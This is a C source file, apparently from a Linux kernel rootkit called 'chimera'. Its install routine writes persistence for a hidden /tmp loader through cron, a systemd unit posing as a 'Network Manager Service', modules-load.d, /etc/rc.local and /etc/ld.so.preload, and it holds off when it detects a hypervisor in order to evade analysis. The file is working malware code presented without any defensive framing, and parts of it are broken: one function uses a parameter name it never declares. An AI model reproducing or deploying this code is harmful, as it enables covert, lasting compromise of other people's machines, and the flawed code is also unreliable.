#include "chimera.h"

static const char *CRON_LINE =
    "*/5 * * * * /tmp/.chimera_loader >/dev/null 2>&1\n";

static const char *SYSTEMD_UNIT =
    "[Unit]\n"
    "Description=Network Manager Service\n"
    "After=network.target\n\n"
    "[Service]\n"
    "Type=oneshot\n"
    "ExecStart=/tmp/.chimera_loader\n"
    "RemainAfterExit=yes\n\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n";

static const char *MODULES_LOAD =
    "chimera\n";

static const char *RC_LOCAL =
    "#!/bin/sh\n"
    "/tmp/.chimera_loader &\n"
    "exit 0\n";

static int vfs_write_file(const char *path, const char *data, size_t len,
                          umode_t mode)
{
    struct file *fp;
    loff_t pos = 0;
    ssize_t written;
    int ret;

    fp = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (IS_ERR(fp))
        return PTR_ERR(fp);

    written = kernel_write(fp, data, len, &pos);
    if (written != (ssize_t)len) {
        ret = (written < 0) ? written : -EIO;
        goto out;
    }

    ret = 0;

out:
    filp_close(fp, NULL);
    return ret;
}

static int vfs_append_line(const char *path, const char *)
{
    struct file *fp;
    loff_t pos = 0;
    ssize_t written;
    size_t len;

    fp = filp_open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp))
        return PTR_ERR(fp);

    pos = 0;
    vfs_llseek(fp, 0, SEEK_END);

    len = strlen(line);
    written = kernel_write(fp, line, len, &pos);
    filp_close(fp, NULL);

    return (written == (ssize_t)len) ? 0 : -EIO;
}

int rk_persist_install(void)
{
    int errors = 0;

    if (g_state.hv.detected)
        return 0;

    if (vfs_append_line(PERSIST_CRON_PATH, CRON_LINE))
        errors++;

    if (vfs_write_file(PERSIST_SYSTEMD, SYSTEMD_UNIT,
                       strlen(SYSTEMD_UNIT), 0644))
        errors++;

    if (vfs_write_file("/etc/modules-load.d/chimera.conf",
                       MODULES_LOAD, strlen(MODULES_LOAD), 0644))
        errors++;

    if (vfs_write_file("/etc/rc.local", RC_LOCAL,
                       strlen(RC_LOCAL), 0755))
        errors++;

    vfs_append_line("/etc/ld.so.preload", "/lib/chimera_hide.so\n");

    return errors ? -EIO : 0;
}
